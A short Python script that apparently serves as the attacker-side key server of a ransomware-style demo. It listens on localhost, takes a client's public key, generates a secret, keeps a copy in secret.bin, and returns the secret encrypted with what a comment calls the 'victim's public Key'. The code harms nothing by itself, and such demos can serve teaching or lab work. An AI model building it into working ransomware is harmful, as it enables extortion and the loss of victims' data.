import socket
import os

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding


PORT = 1234


def main():
    server = socket.socket()
    server.bind(("127.0.0.1", PORT))
    server.listen(1)
    print(f"[+] Server listening on: {PORT}")
    conn, addr = server.accept()
    print(f"[+] Received connection from {addr}")

    pub_key_bytes = conn.recv(4096)
    pub_key = serialization.load_pem_public_key(pub_key_bytes)
    print("[+] Public Key Received")
    secret_key = os.urandom(32)
    print(f"[i] Generated Secret: {secret_key.hex()}")
    with open("secret.bin", "wb") as file:
        file.write(secret_key)
    print("[i] Copy of secret saved on ./secret.bin")

    # Encrypt secret with victim's public Key
    encrypted_secret_key = pub_key.encrypt(secret_key, padding.OAEP(padding.MGF1(algorithm=hashes.SHA256()), hashes.SHA256(), None))

    conn.sendall(encrypted_secret_key)
    conn.close()
    server.close()


if __name__ == "__main__":
    main()





